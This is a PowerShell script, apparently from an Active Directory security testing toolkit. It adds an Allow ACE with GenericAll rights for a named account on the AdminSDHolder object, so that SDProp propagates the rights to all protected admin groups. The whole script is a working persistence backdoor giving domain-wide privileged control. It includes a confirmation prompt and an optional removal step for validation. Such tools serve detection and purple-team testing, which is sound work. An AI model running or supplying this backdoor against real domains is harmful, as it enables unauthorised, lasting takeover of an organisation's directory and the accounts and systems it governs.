<#
.SYNOPSIS
    Grants GenericAll on the AdminSDHolder object to a specified principal.

.DESCRIPTION
    Adds an Allow ACE with GenericAll rights for the target account on AdminSDHolder.
    SDProp will propagate this to every protected group member within 60 minutes.

    Idempotent: will not insert a duplicate ACE if one already exists for the SID.

    Use -Remove to pull the ACE back after validation.

.PARAMETER Account
    SamAccountName of the account to grant GenericAll.

.PARAMETER Remove
    After inserting the ACE, pause for validation, then remove it on ENTER.

.EXAMPLE
    .\Add-AdminSDHolderBackdoor.ps1 -Account "svc_backup"

.EXAMPLE
    .\Add-AdminSDHolderBackdoor.ps1 -Account "svc_backup" -Remove

.AUTHOR
    franckferman
#>

param (
    [Parameter(Mandatory = $true)]
    [string]$Account,
    [switch]$Remove
)

$_Private = Join-Path $PSScriptRoot '..' 'Private'
$_Constants = Join-Path $_Private 'Constants.ps1'
$_Helpers   = Join-Path $_Private 'Helpers.ps1'
if (Test-Path $_Constants) { . $_Constants }
if (Test-Path $_Helpers)   { . $_Helpers }

function Add-AdminSDHolderBackdoor {
    param (
        [Parameter(Mandatory)][string]$Account,
        [switch]$Remove
    )

    Import-Module ActiveDirectory -ErrorAction Stop

    Write-Host "==========================================================" -ForegroundColor Cyan
    Write-Host " AdminSDHolder Backdoor" -ForegroundColor Cyan
    Write-Host "==========================================================" -ForegroundColor Cyan

    # Resolve account
    Write-Host "`n[*] Resolving: $Account... " -NoNewline
    try {
        $User = Get-ADUser -Identity $Account -ErrorAction Stop
        Write-Host "$($User.Name) ($($User.SID))" -ForegroundColor Green
    }
    catch {
        Write-Host "not found." -ForegroundColor Red
        return
    }

    # Domain context
    try {
        if (Get-Command Get-DomainContext -ErrorAction SilentlyContinue) {
            $Ctx = Get-DomainContext
            $AdminSDHolderDN = $Ctx.AdminSDHolderDN
        }
        else {
            $Domain          = Get-ADDomain
            $AdminSDHolderDN = "CN=AdminSDHolder,CN=System,$($Domain.DistinguishedName)"
        }
    }
    catch {
        Write-Host "[!] Domain query failed: $($_.Exception.Message)" -ForegroundColor Red
        return
    }

    Write-Host "[*] Target: $AdminSDHolderDN" -ForegroundColor Yellow

    # Bind
    try {
        $ADObject = [ADSI]"LDAP://$AdminSDHolderDN"
        $ACL      = $ADObject.ObjectSecurity
    }
    catch {
        Write-Host "[!] Bind failed: $($_.Exception.Message)" -ForegroundColor Red
        return
    }

    # Idempotency check
    $SIDObj   = New-Object System.Security.Principal.SecurityIdentifier($User.SID)
    $Existing = $ACL.GetAccessRules($true, $false, [System.Security.Principal.SecurityIdentifier]) |
        Where-Object {
            $_.IdentityReference.Value -eq $SIDObj.Value -and
            ($_.ActiveDirectoryRights -band [System.DirectoryServices.ActiveDirectoryRights]::GenericAll) -and
            $_.AccessControlType -eq [System.Security.AccessControl.AccessControlType]::Allow
        }
    if ($Existing) {
        Write-Host "[!] GenericAll ACE for $($User.SamAccountName) already present." -ForegroundColor Yellow
        return
    }

    # Confirmation
    $Confirm = Read-Host "`nGrant GenericAll to $($User.SamAccountName) on AdminSDHolder? (Y/N)"
    if ($Confirm -notmatch "^[Yy]$") {
        Write-Host "[-] Aborted." -ForegroundColor Yellow
        return
    }

    # Build rule before try block (needed in -Remove section regardless of path)
    $Rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
        $SIDObj,
        [System.DirectoryServices.ActiveDirectoryRights]::GenericAll,
        [System.Security.AccessControl.AccessControlType]::Allow
    )

    # Insert
    Write-Host "[*] Inserting ACE... " -NoNewline
    try {
        $ACL.AddAccessRule($Rule)
        $ADObject.CommitChanges()
        Write-Host "done." -ForegroundColor Green
    }
    catch {
        Write-Host "failed: $($_.Exception.Message)" -ForegroundColor Red
        return
    }

    Write-Host "`n  Account : $($User.Name) ($($User.SamAccountName))" -ForegroundColor Red
    Write-Host "  SID     : $($User.SID)" -ForegroundColor Red
    Write-Host "  Rights  : GenericAll" -ForegroundColor Red
    Write-Host "  Object  : AdminSDHolder (SDProp propagates within 60 min)" -ForegroundColor Red

    # Remove after validation
    if ($Remove) {
        Write-Host "`n[*] Press ENTER to remove the ACE." -ForegroundColor Yellow
        Read-Host | Out-Null

        Write-Host "[*] Removing ACE... " -NoNewline
        try {
            $ADObject = [ADSI]"LDAP://$AdminSDHolderDN"
            $ACL      = $ADObject.ObjectSecurity
            $ACL.RemoveAccessRule($Rule) | Out-Null
            $ADObject.CommitChanges()
            Write-Host "done." -ForegroundColor Green
        }
        catch {
            Write-Host "failed: $($_.Exception.Message)" -ForegroundColor Red
            Write-Host "[*] Run Repair-AdminSDHolderACL.ps1 -Remediate to force removal." -ForegroundColor Yellow
        }
    }
    else {
        Write-Host "`n[*] Run Repair-AdminSDHolderACL.ps1 -Remediate to remove." -ForegroundColor Yellow
    }
}

if ($MyInvocation.InvocationName -ne '.') {
    Add-AdminSDHolderBackdoor @PSBoundParameters
}
